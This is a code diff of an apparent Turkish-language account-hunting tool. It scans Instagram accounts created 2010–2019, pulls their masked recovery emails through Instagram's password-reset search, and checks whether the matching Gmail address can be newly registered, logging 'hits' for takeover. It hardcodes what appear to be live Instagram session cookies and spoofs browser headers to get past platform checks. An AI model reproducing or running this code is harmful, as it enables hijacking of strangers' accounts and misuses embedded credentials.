@@ -195,7 +195,7 @@ _web_state = {
     'recent_hits': [],
 }
 _web_lock = Lock()
-_m1_info            = {}
+_m1_info  = {}
 
 _m1_ABOUT_SESSION_INDEX = 0
 _m1_ABOUT_SESSION_LOCK  = Lock()
@@ -212,42 +212,42 @@ _m1_about_tokens        = {
 _m1_session  = requests.Session()
 _m1__session = requests.Session()
 
+HARDCODED_SESSIONS = [
+{
+  "csrftoken": "SA7WOqODWLd9lq8tepS9lO5hEyQiiAjf",
+  "mid": "acXucwABAAEpLL9LTj_zE5mdFUm4",
+  "ig_did": "68B3C797-5435-4284-91DF-36BB57ACE8EC",
+  "sessionid": "37980233613%3AzkmZM0x4USstRi%3A13%3AAYgWd5cwudKpm1w0dyEb0AD6LFdG2zY5HVncDeFJfA",
+  "ds_user_id": "37980233613"
+},
+{
+  "csrftoken": "tPvqXDZm6bD62k-_0a2rRl",
+  "mid": "acVQKgABAAHxWQ3ymupl3SPVKxqV",
+  "ig_did": "02AD7E3A-B843-43E2-B5BD-520BA7392ACA",
+  "sessionid": "74090320231%3ACtvz4lnFouLKGZ%3A25%3AAYg8Be6H6r7-c9Vz5Jhewf-KhM-nvusIhXYYRBqZUw",
+  "ds_user_id": "74090320231"
+}
+]
+
 _M1_VIP_CONFIG = {
-    "vip_date_filter":    True,
+    "vip_date_filter": True,
     "vip_follower_filter": False,
-    "vip_min_followers":  0,
-    "vip_date_min":       2010,
-    "vip_date_max":       2019,
-    "vip_about_info":     True,
-    "vip_country":        False,
+    "vip_min_followers": 0,
+    "vip_date_min": 2010,
+    "vip_date_max": 2019,
+    "vip_about_info": True,
+    "vip_country": False
 }
 
 _M1_CONFIG = {
     "insta_graphql": "https://www.instagram.com/api/graphql",
-    "google_url":    "https://accounts.google.com",
-    "form_type":     "application/x-www-form-urlencoded; charset=UTF-8",
-    "token_file":    "tokens.txt",
-    "output_file":   "@weyn_hits.txt",
-    "domain":        "@gmail.com",
-    "id_ranges":     ID_RANGES,
+    "google_url": "https://accounts.google.com",
+    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "token_file": "tokens.txt",
+    "output_file": "@weyn_hits.txt",
+    "domain": "@gmail.com",
+    "id_ranges": ID_RANGES,
 }
-
-HARDCODED_SESSIONS = [
-    {
-        "csrftoken": "SA7WOqODWLd9lq8tepS9lO5hEyQiiAjf",
-        "mid":       "acXucwABAAEpLL9LTj_zE5mdFUm4",
-        "ig_did":    "68B3C797-5435-4284-91DF-36BB57ACE8EC",
-        "sessionid": "37980233613%3AzkmZM0x4USstRi%3A13%3AAYgWd5cwudKpm1w0dyEb0AD6LFdG2zY5HVncDeFJfA",
-        "ds_user_id":"37980233613"
-    },
-    {
-        "csrftoken": "tPvqXDZm6bD62k-_0a2rRl",
-        "mid":       "acVQKgABAAHxWQ3ymupl3SPVKxqV",
-        "ig_did":    "02AD7E3A-B843-43E2-B5BD-520BA7392ACA",
-        "sessionid": "74090320231%3ACtvz4lnFouLKGZ%3A25%3AAYg8Be6H6r7-c9Vz5Jhewf-KhM-nvusIhXYYRBqZUw",
-        "ds_user_id":"74090320231"
-    }
-]
 
 _M1_ABOUT_WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"
 
@@ -318,28 +318,29 @@ def _m1_about_refresh_tokens(cookie_str=None, username="instagram"):
             f"https://www.instagram.com/{username}/",
             headers={
                 "User-Agent": _M1_ABOUT_WEB_UA,
-                "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
-                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Accept-Encoding": "gzip, deflate",
                 "Cookie": _cookie,
                 "Referer": "https://www.instagram.com/",
             }
         )
         html = resp.text
-        m  = re.search(r'"f":"([^"]+)"', html)
-        m2 = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
-        m3 = re.search(r'"server_revision":(\d+)', html)
-        m4 = re.search(r'__bkv=([a-f0-9]{40,})', html)
-        m5 = re.search(r'"hsi":"([^"]+)"', html)
-        dm = re.search(r'"__dyn":"([^"]+)"', html)
-        cm = re.search(r'"__csr":"([^"]+)"', html)
+        m      = re.search(r'"f":"([^"]+)"', html)
+        m2     = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
+        m3     = re.search(r'"server_revision":(\d+)', html)
+        m4     = re.search(r'__bkv=([a-f0-9]{40,})', html)
+        m5     = re.search(r'"hsi":"([^"]+)"', html)
+        dyn_m  = re.search(r'"__dyn":"([^"]+)"', html)
+        csr_m  = re.search(r'"__csr":"([^"]+)"', html)
         with _m1_about_token_lock:
-            if m:  _m1_about_tokens["fb_dtsg"] = m.group(1)
-            if m2: _m1_about_tokens["lsd"]     = m2.group(1)
-            if m3: _m1_about_tokens["rev"]     = m3.group(1)
-            if m4: _m1_about_tokens["bkv"]     = m4.group(1)
-            if m5: _m1_about_tokens["hsi"]     = m5.group(1)
-            if dm: _m1_about_tokens["dyn"]     = dm.group(1)
-            if cm: _m1_about_tokens["csr"]     = cm.group(1)
+            if m:     _m1_about_tokens["fb_dtsg"] = m.group(1)
+            if m2:    _m1_about_tokens["lsd"]     = m2.group(1)
+            if m3:    _m1_about_tokens["rev"]     = m3.group(1)
+            if m4:    _m1_about_tokens["bkv"]     = m4.group(1)
+            if m5:    _m1_about_tokens["hsi"]     = m5.group(1)
+            if dyn_m: _m1_about_tokens["dyn"]     = dyn_m.group(1)
+            if csr_m: _m1_about_tokens["csr"]     = csr_m.group(1)
         return _m1_about_tokens["fb_dtsg"] is not None
     except Exception:
         return False
@@ -366,9 +367,9 @@ def _m1_try_get_about(user_id, username):
             bkv     = _m1_about_tokens.get("bkv", "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739")
         if not fb_dtsg:
             return {"join_date": None, "country": None, "former_usernames": []}
-        hsi    = _m1_about_tokens.get("hsi", "7618017801523903853")
-        dyn    = _m1_about_tokens.get("dyn", "7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2")
-        csr    = _m1_about_tokens.get("csr", "")
+        hsi     = _m1_about_tokens.get("hsi", "7618017801523903853")
+        dyn     = _m1_about_tokens.get("dyn", "7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2")
+        csr     = _m1_about_tokens.get("csr", "")
         jazoest = '2' + str(sum(ord(c) for c in fb_dtsg))
         spin_t  = str(int(time.time()))
         post_params = {
@@ -385,12 +386,16 @@ def _m1_try_get_about(user_id, username):
         resp = requests.post(url, headers={
             "User-Agent": _M1_ABOUT_WEB_UA,
             "Accept": "*/*",
-            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
+            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Accept-Encoding": "gzip, deflate",
             "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
             "Origin": "https://www.instagram.com",
             "Referer": f"https://www.instagram.com/{username}/",
             "Cookie": _cookie,
             "X-CSRFToken": _csrf,
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
         }, data=urllib.parse.urlencode(post_params))
         raw = resp.text
         if raw.startswith("for (;;);"):
@@ -415,7 +420,7 @@ def _m1_try_get_about(user_id, username):
                     d   = item.get("data", {})
                     key = d.get("key", "")
                     if "about_this_account_country" in key and "visibility" not in key:
-                        result["country"] = d.get("initial", "-")
+                        result["country"] = d.get("initial", "Paylaşılmadı")
                         break
         except Exception:
             pass
@@ -608,25 +613,47 @@ def _m1_get_masked(query):
     payload = {
         'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "f",
         '__hs': "20563.HYP:instagram_web_pkg.2.1...0", 'dpr': "3",
-        '__ccg': "GOOD", '__rev': "1037676804",
-        '__comet_req': "7", 'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
-        'jazoest': "22394", '__spin_r': "1037676804", '__spin_b': "trunk",
-        '__spin_t': "1776670246",
+        '__ccg': "GOOD", '__rev': "1037676804", '__s': "nz2w5z:1vm2xs:94sap8",
+        '__hsi': "7630740602831122681",
+        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
+        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
+        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
+        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
+        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
+        '__comet_req': "7",
+        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8", 'jazoest': "22394",
+        '__spin_r': "1037676804", '__spin_b': "trunk", '__spin_t': "1776670246",
         '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
+        'qpl_active_flow_ids': "516759801",
         'fb_api_caller_class': "RelayModern",
         'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
         'server_timestamps': "true",
         'variables': "{\"params\":{\"event_request_id\":\"7ca5daae-5770-42dd-b77b-0cf23a865a7f\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"553aadae-3ec5-4031-8395-efbabcc670ce\"}}",
         'doc_id': "26178667145161478",
+        'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
     }
     headers = {
         'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+        'sec-ch-ua-model': "\"\"",
         'x-ig-app-id': "936619743392459",
+        'x-ig-max-touch-points': "5",
+        'sec-ch-ua-mobile': "?0",
         'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
         'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
+        'sec-ch-ua-platform-version': "\"\"",
+        'x-asbd-id': "359341",
+        'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
+        'sec-ch-prefers-color-scheme': "dark",
         'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
+        'sec-ch-ua-platform': "\"Linux\"",
         'origin': "https://www.instagram.com",
-        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np"
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.instagram.com/accounts/password/reset/",
+        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
     }
     try:
         response = requests.post(url, data=payload, headers=headers, timeout=20)
@@ -658,22 +685,21 @@ def _m1_get_country_flag(country_name):
         "Peru": "🇵🇪", "Venezuela": "🇻🇪", "Güney Afrika": "🇿🇦", "Nijerya": "🇳🇬",
         "Kenya": "🇰🇪", "Fas": "🇲🇦", "Tunus": "🇹🇳", "Cezayir": "🇩🇿",
         "Libya": "🇱🇾", "Sudan": "🇸🇩", "Etyopya": "🇪🇹", "Gana": "🇬🇭",
-        "Tanzanya": "🇹🇿", "Uganda": "🇺🇬", "Kamerun": "🇨🇲", "Senegal": "🇸🇳",
-        "Ürdün": "🇯🇴", "Lübnan": "🇱🇧", "Suriye": "🇸🇾", "Yemen": "🇾🇪",
-        "Umman": "🇴🇲", "Bahreyn": "🇧🇭", "İsrail": "🇮🇱", "Filistin": "🇵🇸",
-        "Afganistan": "🇦🇫", "Sri Lanka": "🇱🇰", "Nepal": "🇳🇵", "Myanmar": "🇲🇲",
-        "Kamboçya": "🇰🇭", "Moğolistan": "🇲🇳", "Kırgızistan": "🇰🇬",
+        "Tanzanya": "🇹🇿", "Uganda": "🇺🇬", "Kamerun": "🇨🇲", "Fildişi Sahili": "🇨🇮",
+        "Senegal": "🇸🇳", "Ürdün": "🇯🇴", "Lübnan": "🇱🇧", "Suriye": "🇸🇾",
+        "Yemen": "🇾🇪", "Umman": "🇴🇲", "Bahreyn": "🇧🇭", "İsrail": "🇮🇱",
+        "Filistin": "🇵🇸", "Afganistan": "🇦🇫", "Sri Lanka": "🇱🇰", "Nepal": "🇳🇵",
+        "Myanmar": "🇲🇲", "Kamboçya": "🇰🇭", "Moğolistan": "🇲🇳", "Kırgızistan": "🇰🇬",
         "Tacikistan": "🇹🇯", "Türkmenistan": "🇹🇲", "Yeni Zelanda": "🇳🇿",
         "İrlanda": "🇮🇪", "Slovakya": "🇸🇰", "Slovenya": "🇸🇮",
         "Bosna Hersek": "🇧🇦", "Karadağ": "🇲🇪", "Kuzey Makedonya": "🇲🇰",
         "Moldova": "🇲🇩", "Belarus": "🇧🇾", "Litvanya": "🇱🇹", "Letonya": "🇱🇻",
         "Estonya": "🇪🇪", "Lüksemburg": "🇱🇺", "Malta": "🇲🇹", "Kıbrıs": "🇨🇾",
         "İzlanda": "🇮🇸", "Ermenistan": "🇦🇲", "Ekuador": "🇪🇨", "Bolivya": "🇧🇴",
-        "Paraguay": "🇵🇾", "Uruguay": "🇺🇾", "Küba": "🇨🇺",
-        "Guatemala": "🇬🇹", "Honduras": "🇭🇳", "El Salvador": "🇸🇻",
-        "Nikaragua": "🇳🇮", "Kosta Rika": "🇨🇷", "Panama": "🇵🇦",
+        "Paraguay": "🇵🇾", "Uruguay": "🇺🇾", "Küba": "🇨🇺", "Dominik Cumhuriyeti": "🇩🇴",
+        "Haiti": "🇭🇹", "Porto Riko": "🇵🇷", "Guatemala": "🇬🇹", "Honduras": "🇭🇳",
+        "El Salvador": "🇸🇻", "Nikaragua": "🇳🇮", "Kosta Rika": "🇨🇷", "Panama": "🇵🇦",
         "Trinidad ve Tobago": "🇹🇹", "Jamaika": "🇯🇲",
-        "Fildişi Sahili": "🇨🇮", "Dominik Cumhuriyeti": "🇩🇴",
     }
     if country_name in flags:
         return flags[country_name]
@@ -730,6 +756,14 @@ def _m1_get_tl_background():
             pass
         time.sleep(120)
 
+def _m1_cinstagram(email, token, chat_id, user, loc_session):
+    global _m1_good_insta, _m1_bad_insta
+    if _m1_lookup_instagram(email):
+        _m1_good_insta += 1
+        _m1_cgmail(email, token, chat_id, user, loc_session)
+    else:
+        _m1_bad_insta += 1
+
 def _m1_gtokens():
     max_retries = 2
     endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
@@ -753,8 +787,12 @@ def _m1_gtokens():
                 continue
             tl = tok.group(2)
             cookies = {'__Host-GAPS': host}
-            hdrs.update({'authority': 'accounts.google.com', 'origin': _M1_CONFIG["google_url"],
-                         'user-agent': random.choice(_M1_USER_AGENTS)})
+            hdrs.update({
+                'authority': 'accounts.google.com',
+                'origin': _M1_CONFIG["google_url"],
+                'referer': f"{_M1_CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
+                'user-agent': random.choice(_M1_USER_AGENTS)
+            })
             data = {
                 'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                 'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
@@ -870,7 +908,7 @@ def _m1_cgmail(email, token, chat_id, user, loc_session):
                 'content-type': _M1_CONFIG["form_type"],
                 'google-accounts-xsrf': '1',
                 'origin': _M1_CONFIG["google_url"],
-                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn&TL={tl}",
+                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                 'user-agent': random.choice(_M1_USER_AGENTS)
             }
             params = {'TL': tl}
@@ -882,7 +920,7 @@ def _m1_cgmail(email, token, chat_id, user, loc_session):
                 "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                 "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
             )
-            resp = _m1__session.post(
+            resp = loc_session.post(
                 f"{_M1_CONFIG['google_url']}/_/signup/usernameavailability",
                 params=params, cookies=cookies, headers=headers, data=data
             )
@@ -936,36 +974,22 @@ def _m1_cgmail(email, token, chat_id, user, loc_session):
     except Exception:
         _m1_bad_email += 1
 
-def _m1_cinstagram(email, token, chat_id, user, loc_session):
-    global _m1_good_insta, _m1_bad_insta
-    if _m1_lookup_instagram(email):
-        _m1_good_insta += 1
-        _m1_cgmail(email, token, chat_id, user, loc_session)
-    else:
-        _m1_bad_insta += 1
-
 def _m1_stats():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         show_weyn_banner()
-        with _m1_found_lock:
-            if _m1_found_emails:
-                print(f"{G}{B}  Recent Hits:{RESET}")
-                for em in _m1_found_emails[-5:]:
-                    print(f"  {W}{em}{RESET}")
-                print()
-        print(f"""{C}{B}
-╭──────────────────────────────────────────╮
-│            M E T H O D  1               │
-├──────────────────────────────────────────┤
-{G}│  HITS FOUND     ➤  {W}{_m1_hits:<6}{C}                │
-{G}│  GOOD INSTA     ➤  {W}{_m1_good_insta:<6}{C}                │
-{R}│  BAD INSTA      ➤  {W}{_m1_bad_insta:<6}{C}                │
-{R}│  BAD EMAIL      ➤  {W}{_m1_bad_email:<6}{C}                │
-{Y}│  TAKEN GMAIL    ➤  {W}{_m1_taken:<6}{C}                │
-{Y}│  LIMIT          ➤  {W}{_m1_limit:<6}{C}                │
-{C}│  TOTAL SCANNED  ➤  {W}{_m1_total:<6}{C}                │
-╰──────────────────────────────────────────╯
+        print(f"""
+{C}{B}╭──────────────────────────────────────────────╮
+│  𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒                              │
+├──────────────────────────────────────────────┤
+{G}{B}│  HITS FOUND    ➤  {W}{B}{_m1_hits}{RESET}
+{G}{B}│  GOOD INSTA    ➤  {W}{B}{_m1_good_insta}{RESET}
+{R}{B}│  BAD INSTA     ➤  {W}{B}{_m1_bad_insta}{RESET}
+{R}{B}│  BAD EMAIL     ➤  {W}{B}{_m1_bad_email}{RESET}
+{Y}{B}│  TAKEN GMAIL   ➤  {W}{B}{_m1_taken}{RESET}
+{Y}{B}│  LIMIT HITS    ➤  {W}{B}{_m1_limit}{RESET}
+{C}{B}│  TOTAL SCANNED ➤  {W}{B}{_m1_total}{RESET}
+{C}{B}╰──────────────────────────────────────────────╯
 {RESET}""")
         time.sleep(0.3)
 
